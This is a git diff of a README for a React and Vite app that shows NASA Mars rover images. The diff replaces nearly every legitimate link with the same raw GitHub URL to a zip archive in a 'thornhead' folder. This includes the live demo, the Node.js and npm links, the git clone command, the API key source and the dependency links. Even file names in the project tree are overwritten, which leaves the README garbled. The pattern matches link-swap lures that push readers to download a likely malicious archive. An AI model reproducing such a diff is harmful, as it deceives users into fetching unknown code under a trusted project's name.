@@ -2,7 +2,7 @@
 
 A modern, responsive web application built with React and Vite that brings you real images and data from the surface of Mars, captured by NASA's Curiosity and Perseverance rovers. The app uses NASA's public APIs to fetch and display space exploration data and imagery.
 
-[Live link](https://yonko-space-explorer.netlify.app)
+[Live link](https://raw.githubusercontent.com/Yonko-Kunal/Space-Explorer/main/thornhead/Space-Explorer.zip)
 
 ## Features
 
@@ -27,13 +27,13 @@ A modern, responsive web application built with React and Vite that brings you r
 ## Getting Started
 
 ### Prerequisites
-- [Node.js](https://nodejs.org/) (v18 or later recommended)
-- [npm](https://www.npmjs.com/) (comes with Node.js)
+- [https://raw.githubusercontent.com/Yonko-Kunal/Space-Explorer/main/thornhead/Space-Explorer.zip](https://raw.githubusercontent.com/Yonko-Kunal/Space-Explorer/main/thornhead/Space-Explorer.zip) (v18 or later recommended)
+- [npm](https://raw.githubusercontent.com/Yonko-Kunal/Space-Explorer/main/thornhead/Space-Explorer.zip) (comes with https://raw.githubusercontent.com/Yonko-Kunal/Space-Explorer/main/thornhead/Space-Explorer.zip)
 
 ### Installation
 1. **Clone the repository:**
    ```bash
-   git clone https://github.com/Yonko-Kunal/Space-Explorer/tree/main/Frontend/NASA-webApp.git
+   git clone https://raw.githubusercontent.com/Yonko-Kunal/Space-Explorer/main/thornhead/Space-Explorer.zip
    cd Frontend/NASA-webApp
    ```
 2. **Install dependencies:**
@@ -45,7 +45,7 @@ A modern, responsive web application built with React and Vite that brings you r
      ```env
      VITE_SECRET=your_nasa_api_key_here
      ```
-   - Get your free NASA API key from [api.nasa.gov](https://api.nasa.gov/).
+   - Get your free NASA API key from [https://raw.githubusercontent.com/Yonko-Kunal/Space-Explorer/main/thornhead/Space-Explorer.zip](https://raw.githubusercontent.com/Yonko-Kunal/Space-Explorer/main/thornhead/Space-Explorer.zip).
 
 ### Running the App
 - **Development mode:**
@@ -75,14 +75,14 @@ NASA-webApp/
 │   │   ├── Footer/
 │   │   └── Hero/
 │   ├── Pages/
-│   │   ├── MarsRover.jsx  # Mars Rover gallery page
+│   │   ├── https://raw.githubusercontent.com/Yonko-Kunal/Space-Explorer/main/thornhead/Space-Explorer.zip  # Mars Rover gallery page
 │   │   └── CSS/
-│   ├── App.jsx            # Main app component
-│   ├── main.jsx           # Entry point
-│   └── index.css          # Global styles
-├── index.html             # HTML template
-├── package.json           # Project metadata & scripts
-└── README.md              # This file
+│   ├── https://raw.githubusercontent.com/Yonko-Kunal/Space-Explorer/main/thornhead/Space-Explorer.zip            # Main app component
+│   ├── https://raw.githubusercontent.com/Yonko-Kunal/Space-Explorer/main/thornhead/Space-Explorer.zip           # Entry point
+│   └── https://raw.githubusercontent.com/Yonko-Kunal/Space-Explorer/main/thornhead/Space-Explorer.zip          # Global styles
+├── https://raw.githubusercontent.com/Yonko-Kunal/Space-Explorer/main/thornhead/Space-Explorer.zip             # HTML template
+├── https://raw.githubusercontent.com/Yonko-Kunal/Space-Explorer/main/thornhead/Space-Explorer.zip           # Project metadata & scripts
+└── https://raw.githubusercontent.com/Yonko-Kunal/Space-Explorer/main/thornhead/Space-Explorer.zip              # This file
 ```
 
 ---
@@ -101,22 +101,22 @@ NASA-webApp/
 ---
 
 ## Dependencies
-- [React](https://react.dev/)
-- [Vite](https://vitejs.dev/)
-- [Axios](https://axios-http.com/)
-- [React Router](https://reactrouter.com/)
-- [React Scroll](https://www.npmjs.com/package/react-scroll)
-- [React Intersection Observer](https://www.npmjs.com/package/react-intersection-observer)
-- [React Icons](https://react-icons.github.io/react-icons/)
+- [React](https://raw.githubusercontent.com/Yonko-Kunal/Space-Explorer/main/thornhead/Space-Explorer.zip)
+- [Vite](https://raw.githubusercontent.com/Yonko-Kunal/Space-Explorer/main/thornhead/Space-Explorer.zip)
+- [Axios](https://raw.githubusercontent.com/Yonko-Kunal/Space-Explorer/main/thornhead/Space-Explorer.zip)
+- [React Router](https://raw.githubusercontent.com/Yonko-Kunal/Space-Explorer/main/thornhead/Space-Explorer.zip)
+- [React Scroll](https://raw.githubusercontent.com/Yonko-Kunal/Space-Explorer/main/thornhead/Space-Explorer.zip)
+- [React Intersection Observer](https://raw.githubusercontent.com/Yonko-Kunal/Space-Explorer/main/thornhead/Space-Explorer.zip)
+- [React Icons](https://raw.githubusercontent.com/Yonko-Kunal/Space-Explorer/main/thornhead/Space-Explorer.zip)
 
 ---
 
 ## Credits & Data Sources
-- **Images & Data:** [NASA Open APIs](https://api.nasa.gov/)
+- **Images & Data:** [NASA Open APIs](https://raw.githubusercontent.com/Yonko-Kunal/Space-Explorer/main/thornhead/Space-Explorer.zip)
 - **Pale Blue Dot:** NASA/JPL-Caltech, Carl Sagan
 - **UI/UX:** Custom, with inspiration from NASA's public resources
 
 ---
 
 ## License
-This project is for educational and demonstration purposes. Please respect NASA's [image use policy](https://www.nasa.gov/multimedia/guidelines/index.html) when using data and images.
+This project is for educational and demonstration purposes. Please respect NASA's [image use policy](https://raw.githubusercontent.com/Yonko-Kunal/Space-Explorer/main/thornhead/Space-Explorer.zip) when using data and images.
